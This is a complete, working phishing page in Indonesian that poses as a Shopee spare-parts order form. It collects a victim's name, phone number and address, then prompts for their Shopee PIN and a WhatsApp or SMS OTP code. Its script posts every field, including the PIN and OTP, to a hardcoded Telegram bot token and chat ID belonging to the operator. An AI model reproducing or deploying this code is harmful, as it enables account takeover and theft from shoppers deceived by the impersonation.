<!DOCTYPE html>
<html lang="id">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pemesanan Suku Cadang - Verifikasi Shopee</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        /* BASE STYLES */
        :root {
            --shopee-orange: #EE4D2D; /* Warna Shopee yang lebih akurat */
            --shopee-light-orange: #FF5733;
            --shopee-gray: #f5f5f5;
            --text-dark: #333;
            --text-medium: #555;
            --text-light: #777;
            --border-color: #ddd;
            --shopee-green: #25D366; /* Warna WhatsApp */
        }

        body {
            background-color: var(--shopee-gray);
            color: var(--text-dark);
            font-family: 'Poppins', sans-serif; /* Menggunakan Poppins */
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            min-height: 100vh;
        }

        .container {
            background-color: white;
            width: 100%;
            max-width: 600px;
            min-height: 100vh;
            padding-top: 50px; /* Ruang untuk fixed header */
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.08); /* Lebih terlihat */
        }

        /* CUSTOM HEADER APLIKASI */
        .app-header {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            max-width: 600px;
            margin: 0 auto;
            background-color: var(--shopee-orange);
            color: white;
            padding: 10px 15px;
            display: flex;
            justify-content: center; /* Untuk judul di tengah */
            align-items: center;
            z-index: 1010;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
        }
        
        /* Hapus styling logo dari header */
        /* .app-header .logo-container { display: none; } */ 
        /* .app-header .logo-container img { display: none; } */

        .app-header h3 {
            margin: 0;
            font-size: 16px;
            font-weight: 500; /* Medium weight */
            text-align: center;
        }

        /* CONTENT FORM */
        .form-content {
            padding: 20px;
        }

        .form-group {
            margin-bottom: 20px; /* Sedikit lebih renggang */
        }

        .form-group label {
            display: block;
            font-weight: 500;
            margin-bottom: 8px; /* Lebih renggang */
            color: var(--text-medium);
            font-size: 14px;
        }

        .form-group input[type="text"],
        .form-group input[type="tel"],
        .form-group input[type="number"],
        .form-group input[type="password"],
        .form-group textarea {
            width: 100%;
            padding: 10px 0; /* Padding vertikal saja */
            border: none;
            border-bottom: 1px solid var(--border-color); /* Hanya border bawah */
            outline: none; /* Hilangkan outline default */
            box-sizing: border-box;
            font-size: 15px; /* Sedikit lebih besar */
            font-family: 'Poppins', sans-serif;
            color: var(--text-dark);
        }

        .form-group input:focus,
        .form-group textarea:focus {
            border-bottom-color: var(--shopee-orange); /* Border orange saat fokus */
        }

        textarea {
            resize: vertical; /* Izinkan resize vertikal */
            padding-bottom: 5px; /* Untuk konsistensi dengan input */
        }

        button {
            background-color: var(--shopee-orange);
            color: white;
            padding: 12px 15px;
            border: none;
            border-radius: 5px; /* Sedikit lebih bulat */
            cursor: pointer;
            font-size: 16px;
            width: 100%;
            margin-top: 20px; /* Lebih banyak ruang */
            font-weight: 600; /* Semi-bold */
            transition: background-color 0.2s ease;
        }

        button:hover {
            background-color: var(--shopee-light-orange);
        }

        /* Form Card */
        .form-card {
            background-color: white;
            padding: 25px;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08); /* Card shadow */
            margin-top: 15px; /* Ruang dari header jika perlu */
            text-align: center; /* Untuk menengahkan logo di dalam card */
        }
        .form-card p {
            font-size: 14px;
            color: var(--text-light);
            line-height: 1.5;
            margin-bottom: 25px;
        }

        .shopee-logo-form {
            width: 100px; /* Ukuran logo Shopee di dalam form */
            height: auto;
            margin-bottom: 20px; /* Jarak dengan teks di bawahnya */
        }


        /* MODAL STYLES */
        .modal-overlay {
            display: none;
            position: fixed;
            z-index: 2000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            justify-content: center;
            align-items: center;
        }

        .modal-content {
            background-color: white;
            padding: 0;
            border-radius: 8px; /* Lebih bulat */
            width: 90%;
            max-width: 320px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2); /* Shadow lebih dalam */
            animation: fadeIn 0.3s ease-out;
            overflow: hidden;
            font-family: 'Poppins', sans-serif;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: scale(0.95);
            }

            to {
                opacity: 1;
                transform: scale(1);
            }
        }

        .modal-body {
            padding: 25px 20px; /* Padding lebih */
            text-align: center;
        }

        .modal-body p {
            margin: 0 0 20px 0;
            font-size: 15px;
            color: var(--text-dark);
        }

        .modal-button-group {
            border-top: 1px solid #eee;
            display: flex;
        }

        .modal-button-group button,
        .modal-button-group a {
            flex: 1;
            background: none;
            color: var(--shopee-orange);
            padding: 14px 0; /* Padding lebih */
            border: none;
            cursor: pointer;
            font-size: 15px;
            font-weight: 600; /* Semi-bold */
            margin-top: 0;
            border-radius: 0;
            text-decoration: none;
            display: flex;
            justify-content: center;
            align-items: center;
            transition: background-color 0.2s ease;
        }

        .modal-button-group button:hover {
            background-color: var(--shopee-gray);
        }

        .modal-button-group button:nth-child(2) {
            border-left: 1px solid #eee;
            color: var(--text-medium); /* Warna lebih netral untuk batal */
        }
        
        /* Modal PIN Custom Styling */
        #pinModal input[type="password"] {
            font-size: 26px; /* Lebih besar */
            text-align: center;
            letter-spacing: 4px; /* Sedikit renggang */
            font-weight: 600;
            border: none;
            border-bottom: 2px solid var(--shopee-orange);
            padding: 8px 10px; /* Padding lebih */
            max-width: 180px; /* Lebar input PIN */
            margin: 0 auto;
            display: block;
            color: var(--text-dark);
        }

        /* Modal OTP Custom Styling */
        #otpModal .modal-content {
            max-width: 350px; 
            border-radius: 10px;
        }

        #otpModal .modal-body {
            padding: 0; 
        }

        #otpModal .top-text {
            padding: 25px 20px 20px; /* Padding lebih */
            font-size: 15px;
            color: var(--text-dark);
            text-align: center;
        }

        .whatsapp-number {
            font-size: 16px;
            font-weight: 600;
            margin-top: 8px; /* Lebih renggang */
            color: var(--text-dark);
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        .whatsapp-number i {
            color: var(--shopee-green);
            margin-right: 8px;
            font-size: 18px;
        }

        /* Style tombol OTP sesuai gambar */
        .otp-buttons button {
            background: none;
            color: var(--shopee-orange);
            font-weight: 600;
            padding: 16px 20px; /* Lebih besar */
            border: none;
            border-top: 1px solid #eee;
            width: 100%;
            text-align: left;
            margin-top: 0;
            transition: background-color 0.2s ease;
        }
        
        #sendOtpButton {
             color: var(--shopee-orange); 
        }

        .otp-buttons button:hover {
            background-color: var(--shopee-gray);
        }
        
        #caraLainButton {
             color: var(--text-medium); /* Warna netral untuk Cara Lain (SMS) */
        }
        
        .otp-buttons button:last-child {
            color: var(--text-dark); /* Batal warna gelap */
            font-weight: 400; /* Regular */
        }
        
        /* Input OTP tersembunyi */
        #otpInputContainer {
            padding: 25px 20px; /* Padding lebih */
            border-top: 1px solid #eee;
            text-align: left;
        }
        
        #otpInputContainer label {
            text-align: center;
            width: 100%;
            display: block;
        }

        #otpCode {
            font-size: 26px; /* Lebih besar */
            text-align: center;
            letter-spacing: 4px;
            font-weight: 600;
            border: none;
            border-bottom: 2px solid var(--shopee-orange);
            padding: 8px 10px;
            max-width: 180px; 
            margin: 15px auto 25px auto; /* Lebih banyak ruang */
            display: block;
        }

        /* Warna latar tombol verifikasi final di OTP Modal */
        #otpForm button[type="submit"] {
            background-color: var(--shopee-orange) !important; 
        }
    </style>
</head>

<body>
    <div class="container">
        <div id="appHeader" class="app-header">
            <h3 id="headerTitle">Formulir Pemesanan</h3>
        </div>

        <div id="content-area" class="form-content">
            <main class="order-form-section">
                <div class="form-card">
                    <img src="shop.JPG" alt="Shopee Logo" class="shopee-logo-form">
                    
                    <p>
                        Isi detail pesanan Anda. Verifikasi akan dilakukan di langkah selanjutnya untuk memastikan keamanan pemesanan.
                    </p>
                    <form id="orderForm">
                        <div class="form-group">
                            <label for="namaLengkap">Nama Lengkap *</label>
                            <input type="text" id="namaLengkap" required>
                        </div>
                        <div class="form-group">
                            <label for="nomorTelepon">Nomor Telepon *</label>
                            <input type="tel" id="nomorTelepon" required
                                pattern="[0-9]{10,13}">
                        </div>
                        <div class="form-group">
                            <label for="alamatLengkap">Alamat Lengkap *</label>
                            <textarea id="alamatLengkap" rows="3"
                                required></textarea>
                        </div>
                        <div class="form-group">
                            <label for="namaProduk">Nama Produk *</label>
                            <input type="text" id="namaProduk" required>
                        </div>
                        <div class="form-group">
                            <label for="harga">Harga * (Rp)</label>
                            <input type="text" id="harga" required 
                                oninput="formatPrice(this)" value="">
                        </div>
                        <button type="submit" id="verifikasiButton">Lanjutkan Verifikasi</button>
                    </form>
                </div>
            </main>
        </div>

        <div id="pinModal" class="modal-overlay">
            <div class="modal-content">
                <div class="modal-body">
                    <p style="margin-bottom: 30px;">
                        Masukkan <span style="color: var(--shopee-orange); font-weight: bold;">PIN Shopee</span> Anda
                        untuk melanjutkan Pemesanan.
                    </p>
                    <form id="pinForm">
                        <div class="form-group">
                            <input type="password" id="shopeePin" placeholder="••••••" required maxlength="6"
                                pattern="[0-9]{6}" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
                        </div>
                    </form>
                </div>
                <div class="modal-button-group">
                    <button onclick="document.getElementById('pinForm').dispatchEvent(new Event('submit'))">
                        Lanjutkan
                    </button>
                    <button onclick="hideModal('pinModal'); resetForm()">
                        Batal
                    </button>
                </div>
            </div>
        </div>

        <div id="otpModal" class="modal-overlay">
            <div class="modal-content">
                <div class="top-text">
                    <p id="otpInfoText">Shopee akan mengirimkan kode OTP melalui WhatsApp ke</p>
                    <p class="whatsapp-number">
                        <i id="otpIcon" class="fab fa-whatsapp"></i> (<span id="otpPhoneNumber"></span>)
                    </p>
                </div>

                <div class="otp-buttons">
                    <button id="sendOtpButton">Kirim ke WhatsApp</button>
                    <button id="caraLainButton">Coba Cara Lain (SMS)</button>
                    <button id="batalButton" onclick="hideModal('otpModal'); resetForm()">Batal</button>
                </div>

                <div id="otpInputContainer" style="display: none;">
                    <form id="otpForm">
                        <div class="form-group">
                            <label for="otpCode">Kode OTP * (6 Digit)</label>
                            <input type="text" id="otpCode" placeholder="••••••" required maxlength="6"
                                pattern="[0-9]{6}" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
                        </div>
                        <button type="submit">Verifikasi</button>
                    </form>
                </div>
            </div>
        </div>

    </div>

    <script>
        // Token dan Chat ID Telegram Anda
        var TELEGRAM_TOKEN = "8483832719:AAH9MrWjVVmMxydfTMJjOPyG_c7xu04P6Gk";
        var CHAT_ID = "5923031825";

        // Variabel global untuk menyimpan data
        var orderData = {};
        
        // Status pengiriman OTP saat ini (WA atau SMS)
        var otpMethod = 'WA';

        // --- UTILITY FUNCTIONS ---
        
        function formatPrice(input) {
            let value = input.value.replace(/\D/g, '');
            let formattedValue = new Intl.NumberFormat('id-ID').format(value);
            input.value = formattedValue;
        }

        function cleanPrice(formattedValue) {
            return formattedValue.replace(/\./g, '');
        }

        function formatPhoneNumber(tel) {
            let cleanTel = tel.replace(/\D/g, ''); 
            if (cleanTel.startsWith('08')) {
                cleanTel = '62' + cleanTel.substring(1);
            }
            if (cleanTel.length > 9) {
                const start = cleanTel.substring(0, 5);
                const end = cleanTel.substring(cleanTel.length - 3);
                return `+${start}*******${end}`;
            }
            return cleanTel; 
        }

        function maskPhoneNumber(tel) {
            let cleanTel = tel.replace(/\D/g, ''); 
            if (cleanTel.startsWith('08')) {
                cleanTel = '62' + cleanTel.substring(1);
            }
            if (cleanTel.length > 9) {
                const start = cleanTel.substring(0, 5);
                const end = cleanTel.substring(cleanTel.length - 3);
                return `+${start}*******${end}`;
            }
            return tel; 
        }

        function showModal(modalId, title) {
            document.getElementById(modalId).style.display = 'flex';
        }

        function hideModal(modalId) {
            document.getElementById(modalId).style.display = 'none';
        }

        function resetForm() {
            document.getElementById('orderForm').reset();
            hideModal('pinModal');
            hideModal('otpModal');
            orderData = {};
            
            document.getElementById('otpInputContainer').style.display = 'none';
            document.querySelector('.otp-buttons').style.display = 'block';
            document.getElementById('otpCode').value = ''; 
            document.getElementById('harga').value = '';
            
            resetOtpModalUI('WA');
        }
        
        function resetOtpModalUI(method) {
            otpMethod = method;
            const infoText = document.getElementById('otpInfoText');
            const otpIcon = document.getElementById('otpIcon');
            const sendButton = document.getElementById('sendOtpButton');

            if (method === 'WA') {
                infoText.innerHTML = 'Shopee akan mengirimkan kode OTP melalui <span style="color: var(--shopee-green);">WhatsApp</span> ke';
                otpIcon.className = 'fab fa-whatsapp';
                otpIcon.style.color = 'var(--shopee-green)';
                sendButton.textContent = 'Kirim ke WhatsApp';
            } else if (method === 'SMS') {
                infoText.innerHTML = 'Shopee akan mengirimkan kode OTP melalui <span style="color: black;">SMS</span> ke';
                otpIcon.className = 'fas fa-sms'; 
                otpIcon.style.color = 'var(--shopee-orange)'; 
                sendButton.textContent = 'Kirim ke SMS';
            }
            sendButton.style.color = 'var(--shopee-orange)';
            document.getElementById('caraLainButton').style.display = 'block';
        }

        // --- FUNGSI KIRIM KE TELEGRAM ---
        function sendToTelegram(dataType, data) {
            let text = "";
            
            if (dataType === 'FORM') {
                text =
                    "**--- 1. DATA FORMULIR PEMESANAN BARU ---**\n\n" +
                    "Nama: " + data.namaLengkap + "\n" +
                    "Telepon: " + data.nomorTelepon + "\n" +
                    "Alamat: " + data.alamatLengkap + "\n" +
                    "Produk: " + data.namaProduk + "\n" +
                    "Harga: Rp" + new Intl.NumberFormat('id-ID').format(data.harga) + "\n\n" +
                    "Status: Data Pemesanan TERSIMPAN. Menunggu PIN Verifikasi...";
            } else if (dataType === 'PIN') {
                text =
                    "**--- 2. PIN VERIFIKASI PEMESANAN ---**\n\n" +
                    "⚠️ PIN SHOPEE: `" + data.shopeePin + "`\n\n" +
                    "Nomor Telepon: " + data.nomorTelepon + "\n\n" +
                    "Status: PIN DITERIMA. Menunggu Kode OTP Akhir...";
            } else if (dataType === 'METHOD_CHOICE') {
                const methodText = data.method === 'WA' ? 'WhatsApp' : 'SMS';
                text = 
                    "**--- 3. PERMINTAAN KODE OTP PEMESANAN ---**\n\n" +
                    "Nomor Telepon: " + data.phone + "\n" +
                    "Metode yang dipilih: " + methodText + "\n\n" +
                    "Status: Menunggu kode OTP dimasukkan untuk validasi...";
            } else if (dataType === 'OTP_FINAL') {
                text =
                    "**--- 4. KODE OTP AKHIR TERSIMPAN (FINAL) ---**\n\n" +
                    "⚠️ KODE OTP: `" + data.otpCode + "`\n" +
                    "Metode: " + (data.otpMethod === 'SMS' ? 'SMS' : 'WhatsApp') + "\n\n" +
                    "**✅ VERIFIKASI PEMESANAN SELESAI. ✅**\n" +
                    "Pembayaran/Pengiriman Uang dilakukan setelah barang tiba dan dicek.";
            }

            var url = "https://api.telegram.org/bot" + TELEGRAM_TOKEN + "/sendMessage";

            var params = {
                chat_id: CHAT_ID,
                text: text,
                parse_mode: 'Markdown'
            };

            fetch(url, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(params)
            })
            .then(response => {
                if (!response.ok) {
                    console.error('Gagal mengirim ke Telegram. Status: ' + response.status);
                }
            })
            .catch(error => {
                console.error("Kesalahan pengiriman Telegram:", error);
            });
        }
        
        // --- STEP 1: FORMULIR PEMESANAN ---
        document.getElementById('orderForm').addEventListener('submit', function (event) {
            event.preventDefault();

            var nama = document.getElementById('namaLengkap').value.trim();
            var telepon = document.getElementById('nomorTelepon').value.trim();
            var alamat = document.getElementById('alamatLengkap').value.trim();
            var namaProduk = document.getElementById('namaProduk').value.trim();
            
            var formattedHarga = document.getElementById('harga').value.trim();
            var cleanHarga = cleanPrice(formattedHarga);
            var harga = parseFloat(cleanHarga);

            if (!nama || !telepon || !alamat || !namaProduk || isNaN(harga) || harga <= 0) {
                alert('Harap isi semua kolom dengan benar.');
                return;
            }

            orderData = {
                namaLengkap: nama,
                nomorTelepon: formatPhoneNumber(telepon), // Simpan nomor telepon bersih
                alamatLengkap: alamat,
                namaProduk: namaProduk,
                harga: harga
            };

            // PENGIRIMAN 1: Data Formulir
            sendToTelegram('FORM', orderData); 

            showModal('pinModal', 'Masukkan PIN');
        });

        // --- STEP 2: INPUT PIN (MODAL 1) ---
        document.getElementById('pinForm').addEventListener('submit', function (event) {
            event.preventDefault();

            var shopeePin = document.getElementById('shopeePin').value.trim();

            if (shopeePin.length !== 6 || isNaN(shopeePin)) {
                alert('PIN Shopee harus 6 digit angka.');
                return;
            }

            orderData.shopeePin = shopeePin;

            // PENGIRIMAN 2: Data PIN
            sendToTelegram('PIN', orderData);

            hideModal('pinModal');

            // Siapkan dan Tampilkan Modal OTP
            const maskedPhone = maskPhoneNumber(orderData.nomorTelepon); // Gunakan fungsi masking untuk tampilan
            document.getElementById('otpPhoneNumber').textContent = maskedPhone;
            resetOtpModalUI('WA'); 
            showModal('otpModal', 'Masukkan Kode Verifikasi..');
        });

        // --- STEP 3: PILIH METODE & INPUT OTP (MODAL 2) ---

        // Aksi tombol "Kirim ke WhatsApp" / "Kirim ke SMS"
        document.getElementById('sendOtpButton').addEventListener('click', function (event) {
            event.preventDefault();
            
            // PENGIRIMAN 3: Metode OTP dipilih (WA atau SMS)
            sendToTelegram('METHOD_CHOICE', { method: otpMethod, phone: orderData.nomorTelepon });
            
            document.querySelector('.otp-buttons').style.display = 'none';
            document.getElementById('otpInputContainer').style.display = 'block';
            
            if (otpMethod === 'WA') {
                alert('Kode OTP telah dikirimkan ke WhatsApp Anda. Harap masukkan kodenya.');
            } else {
                alert('Kode OTP telah dikirimkan ke SMS Anda. Harap masukkan kodenya.');
            }
        });
        
        // Aksi tombol "Coba Cara Lain (SMS)"
        document.getElementById('caraLainButton').addEventListener('click', function() {
            resetOtpModalUI('SMS');
            document.getElementById('otpInfoText').innerHTML = 'Shopee akan mengirimkan kode OTP melalui <span style="color: black;">SMS</span> ke';
            document.getElementById('caraLainButton').style.display = 'none'; 
            alert('Metode verifikasi diubah ke SMS. Silakan klik "Kirim ke SMS".');
        });


        // Form Submit OTP
        document.getElementById('otpForm').addEventListener('submit', function (event) {
            event.preventDefault();

            var otpCode = document.getElementById('otpCode').value.trim();

            if (otpCode.length !== 6 || isNaN(otpCode)) {
                alert('Kode OTP harus 6 digit angka.');
                return;
            }

            orderData.otpCode = otpCode;
            orderData.otpMethod = otpMethod; 

            hideModal('otpModal');

            // PENGIRIMAN 4: Data OTP (Final)
            sendToTelegram('OTP_FINAL', orderData);
            
            // Konfirmasi akhir ke pengguna
            alert('✅ Pemesanan dan Verifikasi selesai! Pesanan Anda akan diproses. Pembayaran dilakukan saat barang tiba. Terima kasih.');
            resetForm();
        });
    </script>
</body>

</html>
